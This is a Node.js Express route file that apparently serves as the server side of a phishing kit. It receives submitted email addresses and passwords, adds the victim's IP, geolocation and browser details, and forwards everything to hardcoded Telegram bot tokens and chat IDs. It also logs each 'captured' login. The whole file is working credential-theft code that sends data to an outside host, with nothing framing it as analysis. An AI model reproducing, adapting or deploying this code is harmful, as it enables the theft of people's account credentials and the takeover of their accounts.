const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

// Simple array of bot tokens and chat IDs
const BOTS = [
    {
        token: "7498813414:AAEkmCWxpfqQSu5ry9T-auDJIu7TYyzIiLw",
        chatId: "8268872332"
    },
    {
        token: "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4",
        chatId: "6068638071"
    }
];

async function sendToTelegram(bot, message) {
    try {
        const TELEGRAM_API = `https://api.telegram.org/bot${bot.token}/sendMessage`;
        
        const response = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: bot.chatId,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const responseData = await response.json();
        
        if (!response.ok) {
            if (responseData.error_code === 403) {
                return { success: false, error: 'BOT_BLOCKED' };
            }
            return { success: false, error: responseData.description };
        }

        return { success: true };
        
    } catch (error) {
        return { success: false, error: error.message };
    }
}

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log(`📨 Captured: ${email} : ${password}`);

        // Try all bots
        let sentSuccessfully = false;
        for (const bot of BOTS) {
            try {
                const result = await sendToTelegram(bot, message);
                if (result.success) {
                    console.log(`✅ Sent via bot ${BOTS.indexOf(bot) + 1}`);
                    sentSuccessfully = true;
                    break; // Stop after first successful send
                } else {
                    console.log(`❌ Bot ${BOTS.indexOf(bot) + 1} failed: ${result.error}`);
                }
            } catch (error) {
                console.log(`❌ Bot ${BOTS.indexOf(bot) + 1} error:`, error.message);
            }
        }

        res.status(200).json({
            success: true,
            message: sentSuccessfully ? "Login captured and notified" : "Login captured",
            loginDetails: { 
                email: email,
                device: deviceType, 
                ip, 
                location: locationStr,
                telegramSent: sentSuccessfully
            }
        });

    } catch (error) {
        console.error("❌ Error:", error);
        res.status(500).json({ 
            success: false, 
            message: "Server error" 
        });
    }
});

module.exports = router;